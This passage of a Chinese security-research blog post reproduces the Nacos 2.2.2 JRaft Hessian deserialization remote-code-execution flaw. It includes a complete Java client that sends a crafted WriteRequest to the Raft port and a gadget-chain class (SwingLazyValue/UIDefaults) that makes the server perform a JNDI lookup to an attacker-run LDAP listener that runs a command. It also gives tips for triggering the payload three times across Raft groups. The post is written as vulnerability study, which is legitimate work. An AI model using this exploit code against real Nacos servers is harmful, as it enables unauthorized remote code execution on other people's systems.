+<h3 id="本地启动"><a href="#本地启动" class="headerlink" title="本地启动"></a>本地启动</h3><p>就是突然想记录一下（</p>
+<p>找到这样一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41316955/article/details/135467159">https://blog.csdn.net/qq_41316955/article/details/135467159</a></p>
+<p>根据他的步骤来</p>
+<p>我们要先编译一下项目，目的是为了生成一下grpc的代码</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330213233054.png" alt="image-20250330213233054"></p>
+<p>然后去consistency目录</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330212610402.png" alt="image-20250330212610402"></p>
+<p>添加proto目录为Source Root</p>
+<p>然后找到nacos-console这个模块，直接运行console模块里的 com.alibaba.nacos.Nacos.java，在IDEA的JVM的启动参数配置为单机启动和配置nacos的工作目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-Dnacos.standalone=<span class="hljs-literal">true</span> -Dnacos.home=D:\CTF\Java\Nacos\nacos-2.2.2\nacos-2.2.2<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20250330213058726.png" alt="image-20250330213058726"></p>
+<p>然后我们现在再启动就可以了</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330213510138.png" alt="image-20250330213510138"></p>
+<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>这里可以参考前面写的java远程调试，之前没详细记录，这里再顺便写一下</p>
+<p>前面的docker已经开放了5005的远程调试端口给我们了</p>
+<p>这里开一个jvm debug选项</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330214919561.png" alt="image-20250330214919561"></p>
+<p>然后启动即可</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330215002173.png" alt="image-20250330215002173"></p>
+<p>目前就是知道了hessian反序列化，但是在哪里调用，在哪里触发呢</p>
+<p>如果要发生反序列化，那就肯定是在发生数据读取或者应用的地方，在JRaft中，提交的任务最终将会复制应用到所有 raft 节点上的状态机。onApply 是StateMachine最核心的方法。</p>
+<p>nacos这里就是在<code>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</code>方法</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330220732661.png" alt="image-20250330220732661"></p>
+<p>我们接下来构造一个JRaft写请求去看看他的调用堆栈</p>
+<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>这里我们需要去构建一个写请求(WriteRequest)，模拟数据变更</p>
+<p>grpc所需要的proto文件在<code>nacos-2.2.2/consistency/src/main/proto/</code>里面</p>
+<p>去看源码可以看到，有关一些类并不存在</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330205549132.png" alt="image-20250330205549132"></p>
+<p>这些都在.proto文件里面，将该文件放到我们前面的grpc项目进行编译生成代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">.\protoc.exe --plugin=protoc-gen-grpc-java.exe --grpc-java_out=../java --java_out=../java consistency.proto<br></code></pre></td></tr></table></figure>
+
+<p>然后我们参考JRaft的文档去写客户端：<a target="_blank" rel="noopener" href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/%EF%BC%88%E4%BD%86%E6%98%AF%E4%B8%8D%E5%A4%AA%E5%A5%BD%E5%86%99%EF%BC%8C%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%96%E4%BB%AC%E6%98%AF%E5%92%8B%E5%8F%82%E8%80%83%E7%9A%84%F0%9F%A5%B2%EF%BC%89">https://www.sofastack.tech/projects/sofa-jraft/counter-example/（但是不太好写，我也不知道他们是咋参考的🥲）</a></p>
+<p>引入下面的依赖：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jraft-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alipay.sofa<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>最后可以写出下面的客户端，直接copy文章的，然后让ds给我加了些注释：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ==================== 初始化配置 ====================</span><br>        <span class="hljs-comment">// 目标 Raft 集群 Leader 节点地址（格式：IP:Port）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;127.0.0.1:7848&quot;</span>;<br>        <span class="hljs-comment">// 构造待发送的业务数据（示例为空数据，实际应为序列化后的有效负载）</span><br>        <span class="hljs-type">byte</span>[] poc = Poc.getPoc();<br><span class="hljs-comment">//        byte[] poc = &quot;hello&quot;.getBytes();</span><br><br>        <span class="hljs-comment">// ==================== 初始化 JRaft 客户端服务 ====================</span><br>        <span class="hljs-comment">// 创建 JRaft 客户端服务实例（用于与 Raft 集群通信）</span><br>        <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        <span class="hljs-comment">// 初始化客户端服务（使用默认配置）</span><br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br><br>        <span class="hljs-comment">// ==================== 构建请求目标 ====================</span><br>        <span class="hljs-comment">// 解析 Leader 节点地址信息（PeerId 包含节点 IP 和 Port）</span><br>        <span class="hljs-type">PeerId</span> <span class="hljs-variable">leader</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br><br>        <span class="hljs-comment">// ==================== 构造业务请求 ====================</span><br>        <span class="hljs-comment">// 创建 Nacos 的 WriteRequest 请求（使用 Protobuf 构建）</span><br>        <span class="hljs-type">WriteRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder()<br><span class="hljs-comment">//                .setGroup(&quot;naming_persistent_service_v2&quot;) // Nacos 的持久化服务组名</span><br>                .setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>)<br><span class="hljs-comment">//                .setGroup(&quot;naming_instance_metadata&quot;)</span><br>                .setData(ByteString.copyFrom(poc))         <span class="hljs-comment">// 业务数据（需按 Nacos 格式序列化）</span><br>                .build();<br><br>        <span class="hljs-comment">// ==================== 获取底层 RPC 客户端 ====================</span><br>        <span class="hljs-comment">// 获取 JRaft 的 gRPC 客户端实例（实际通信处理器）</span><br>        <span class="hljs-type">GrpcClient</span> <span class="hljs-variable">grpcClient</span> <span class="hljs-operator">=</span> (GrpcClient) cliClientService.getRpcClient();<br><br>        <span class="hljs-comment">// ==================== 反射注入自定义请求类型 ====================</span><br>        <span class="hljs-comment">// 关键步骤：由于 WriteRequest 是 Nacos 自定义类型，需手动注册到 JRaft 的解析器</span><br><br>        <span class="hljs-comment">// 反射获取 GrpcClient 内部的协议解析器映射表（parserClasses）</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClassesField</span> <span class="hljs-operator">=</span> GrpcClient.class.getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClassesField.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 突破私有访问限制</span><br>        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);<br><br>        <span class="hljs-comment">// 注册 WriteRequest 类型到解析器（使 JRaft 能识别该 Protobuf 类型）</span><br>        parserClasses.put(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br>        <span class="hljs-comment">// 注册响应类型解析器（用于反序列化服务端响应）</span><br>        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-comment">// ==================== 发送请求并获取响应 ====================</span><br>        <span class="hljs-comment">// 同步发送请求到 Leader 节点（参数说明：节点地址，请求对象，超时时间 5000ms）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> grpcClient.invokeSync(leader.getEndpoint(), request, <span class="hljs-number">5000</span>);<br><br>        <span class="hljs-comment">// 打印响应结果（实际应根据业务处理响应）</span><br>        System.out.println(<span class="hljs-string">&quot;Received response: &quot;</span> + res);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们先随便发一点数据过去，目的是看一下调用堆栈，看看是怎么走到反序列化的地方的</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330223652775.png" alt="image-20250330223652775"></p>
+<p>这里调用堆栈就很清晰了，就不过多解释了</p>
+<h2 id="gadget构造"><a href="#gadget构造" class="headerlink" title="gadget构造"></a>gadget构造</h2><p>这里挑一条链子打，采用y4师傅里的，打SwingLazyValue的链子，但是这里环境用的nacos2.2.2版本用的hessian-4.0.63.jar，该版本的jar有内置的黑名单</p>
+<p>y4师傅这里采用的是jndi配合jackson来打，因为nacos是springboot，内置了jackson</p>
+<p>前半部分就用HashMap来触发UIDefaults.get()</p>
+<p>这里写出的poc类如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.grpc.client;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getPoc() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>,<span class="hljs-string">&quot;doLookup&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/Y2FsYw==&quot;</span>&#125;);<br><br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> makeMap(u1, u2);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        output.writeObject(map);<br>        output.flush();<br><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-comment">// 构造哈希相等</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span><span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后前面的客户端代码只要改一下，调用getPoc就可以获取payload的字节数组了</p>
+<p>然后这里用X1r0z师傅的jndimap工具来起一个监听</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330234321716.png" alt="image-20250330234321716"></p>
+<p>因为这里nacos在docker里面，所以用curl来进行验证</p>
+<p>emmm但是很怪，没打通，返回了一个报错</p>
+<p><img src="https://cdn.clown2024.cn/image-20250331000847488.png" alt="image-20250331000847488"></p>
+<p>不过打jndi就要求环境需要出网</p>
+<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>这里的payload只能打一次，如果打第二次就会发生</p>
+<p><img src="https://cdn.clown2024.cn/image-20250330235541466.png" alt="image-20250330235541466"></p>
+<p>调试的时候他也不会进入onApply函数的断点了</p>
+<p>需要销毁环境重建才行，不过这里nacos不止一个RaftGroupService</p>
+<p>至少有三个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">naming_persistent_service_v2<br>naming_instance_metadata<br>naming_service_metadata<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20250330235723916.png" alt="image-20250330235723916"></p>
+<p>所以可以通过这样设置打三次</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/baidu_25299117/article/details/140476392">http://blog.csdn.net/baidu_25299117/article/details/140476392</a></p>
+<p><a target="_blank" rel="noopener" href="https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing">https://lmboke.com/archives/nacos-jraft-hessian-fan-xu-lie-hua-fen-xi-xiang-qing</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/nacos-hessian-rce/">https://y4er.com/posts/nacos-hessian-rce/</a></p>
+<p>还有其他的链子可以看X1r0z师傅的博客：<a target="_blank" rel="noopener" href="https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/">https://exp10it.io/2023/06/nacos-jraft-hessian-deserialization-rce-analysis/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://clowsman.github.io/2025/03/02/Nacos漏洞学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java/">java</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.clown2024.cn/202407151814130.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/" title="NCTF2025复现"><img class="cover" src="http://cdn.clown2024.cn/202407151814131.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NCTF2025复现</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/27/WebLogic%E5%AD%A6%E4%B9%A0/" title="WebLogic学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814121.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">WebLogic学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814129.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-10</div><div class="title">ASM学习</div></div></a></div><div><a href="/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" title="C3P0利用链学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814129.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-01</div><div class="title">C3P0利用链学习</div></div></a></div><div><a href="/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/" title="Hessian利用链"><img class="cover" src="http://cdn.clown2024.cn/202407151814123.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-30</div><div class="title">Hessian利用链</div></div></a></div><div><a href="/2024/11/18/DASCtf-easyjob/" title="DASCtf-easyjob"><img class="cover" src="http://cdn.clown2024.cn/202407151814130.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-18</div><div class="title">DASCtf-easyjob</div></div></a></div><div><a href="/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Hessian反序列化"><img class="cover" src="http://cdn.clown2024.cn/202407151814115.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-08</div><div class="title">Hessian反序列化</div></div></a></div><div><a href="/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="JDK17反射限制绕过学习"><img class="cover" src="http://cdn.clown2024.cn/202407151814125.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-29</div><div class="title">JDK17反射限制绕过学习</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">32</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Ecve-2021-29441"><span class="toc-number">3.</span> <span class="toc-text">未授权访问漏洞(CVE-2021-29441)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2021-29442"><span class="toc-number">4.</span> <span class="toc-text">未授权接口命令执行漏洞(CVE-2021-29442)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#raft-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">Raft Hessian反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3"><span class="toc-number">5.2.</span> <span class="toc-text">前置知识了解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#grpc-java"><span class="toc-number">5.2.1.</span> <span class="toc-text">grpc-java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jraft%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.2.2.</span> <span class="toc-text">JRaft协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">5.3.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">5.4.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%90%AF%E5%8A%A8"><span class="toc-number">5.4.1.</span> <span class="toc-text">本地启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95"><span class="toc-number">5.4.2.</span> <span class="toc-text">断点调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82"><span class="toc-number">5.4.3.</span> <span class="toc-text">构造请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gadget%E6%9E%84%E9%80%A0"><span class="toc-number">5.5.</span> <span class="toc-text">gadget构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9D%91%E7%82%B9"><span class="toc-number">5.6.</span> <span class="toc-text">坑点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/" title="Hessian利用链"><img src="http://cdn.clown2024.cn/202407151814123.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hessian利用链"/></a><div class="content"><a class="title" href="/2025/03/30/Hessian%E5%88%A9%E7%94%A8%E9%93%BE/" title="Hessian利用链">Hessian利用链</a><time datetime="2025-03-30T14:55:05.000Z" title="发表于 2025-03-30 22:55:05">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/" title="NCTF2025复现"><img src="http://cdn.clown2024.cn/202407151814131.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NCTF2025复现"/></a><div class="content"><a class="title" href="/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/" title="NCTF2025复现">NCTF2025复现</a><time datetime="2025-03-26T14:23:32.000Z" title="发表于 2025-03-26 22:23:32">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Nacos漏洞学习"><img src="http://cdn.clown2024.cn/202407151814130.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nacos漏洞学习"/></a><div class="content"><a class="title" href="/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Nacos漏洞学习">Nacos漏洞学习</a><time datetime="2025-03-02T13:44:14.000Z" title="发表于 2025-03-02 21:44:14">2025-03-02</time></div></div><div 